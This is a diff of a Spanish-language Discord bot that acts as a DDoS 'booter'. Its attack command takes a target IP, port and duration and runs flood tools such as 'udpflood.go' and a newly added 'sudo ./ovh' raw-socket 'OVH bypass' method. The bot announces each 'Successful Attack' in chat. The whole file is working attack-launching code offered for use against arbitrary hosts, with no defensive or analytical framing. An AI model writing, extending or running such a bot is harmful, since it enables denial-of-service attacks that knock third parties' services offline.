@@ -5,10 +5,10 @@ import asyncio
 
 TOKEN = os.getenv('KEYS')
 if not TOKEN:
-    print("ERROR: No se ha encontrado el token de Discord!!!!")
+    print("ERROR: No se ha encontrado el token de Discord")
     exit(1)
 
-BOT_PREFIX = '!'
+BOT_PREFIX = '$'
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
@@ -16,7 +16,7 @@ bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
 @bot.event
 async def on_ready():
     print(f'Bot conectado como {bot.user.name}')
-    await bot.change_presence(activity=discord.Game(name="Atacando GalaxyBugs"))
+    await bot.change_presence(activity=discord.Game(name="Atacando con UDP"))
 
 async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
     try:
@@ -46,8 +46,9 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         await ctx.send("!attack {method} {ip} {port} {time}")
         return
 
+    # Verificar que no haya nulls
     if ip == "null" or port == "null" or tiempo == "null":
-        await ctx.send("Faltan parametros ip, puerto o tiempo")
+        await ctx.send("Falta la IP, Puerto o Tiempo")
         return
 
     try:
@@ -58,7 +59,7 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         return
 
     if port_int < 1 or port_int > 65535:
-        await ctx.send("Puerto inválido")
+        await ctx.send("Puerto no valido")
         return
 
     if tiempo_int <= 0:
@@ -81,8 +82,12 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack UDPFlood TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
     
+    elif metodo == 'ovh':
+        comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
+        await ctx.send(f'Successful Attack OVH TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+    
     else:
-        await ctx.send('Métodos: udp, udphex, udppps, udpflood')
+        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh')
         return
 
     try:
@@ -97,7 +102,8 @@ async def show_methods(ctx):
 • **udp** - UDPFlood, consumo mayor de cpu
 • **udphex** - UDPHEX
 • **udppps** - UDPpps, the best power
-• **udpflood** - UDPFlood Gbps
+• **udpflood** - udpflood con threads
+• **ovh** - OVH bypass (TCP raw sockets)
 """
     await ctx.send(methods_info)
 
